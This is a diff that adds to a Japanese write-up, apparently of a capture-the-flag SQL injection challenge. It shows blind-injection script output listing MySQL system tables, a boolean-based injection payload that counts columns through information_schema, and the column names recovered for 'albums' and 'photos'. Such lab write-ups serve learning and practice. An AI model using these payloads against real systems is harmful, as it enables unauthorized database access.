@@ -398,6 +398,57 @@ $ python3 mysql-enum-tables-get-binarysearch.py
 albums
 photos
 ```
+```txt
+[-] exploit finished
+columns_priv
+column_stats
+db
+event
+func
+general_log
+gtid_slave_pos
+help_category
+help_keyword
+help_relation
+help_topic
+host
+index_stats
+innodb_index_stats
+innodb_table_stats
+plugin
+proc
+procs_priv
+proxies_priv
+roles_mapping
+servers
+slow_log
+tables_priv
+table_stats
+time_zone
+time_zone_leap_second
+time_zone_name
+time_zone_transition
+time_zone_transition_type
+user
+```
+**photosのカラム数**  
+```txt
+$ python3 mysql-count-columns-get-fullsearch.py
+0
+ AND if(substr((SELECT count(distinct column_name) from  information_schema.columns where table_schema like 'level5' AND table_name like 'photos'),1,1)='0',1=1,1=3)#
+ 
+result: 4
+```
+**albumsのカラム**  
+```txt
+[-] exploit finished
+id
+title
+```
+**photosのカラム**  
+```txt
+result: id,title,filename,parent
+```
 # メモ
 https://www.hamayanhamayan.com/entry/2020/06/25/222618  
 https://graneed.hatenablog.com/entry/2019/12/29/115100#SQL-Injection  
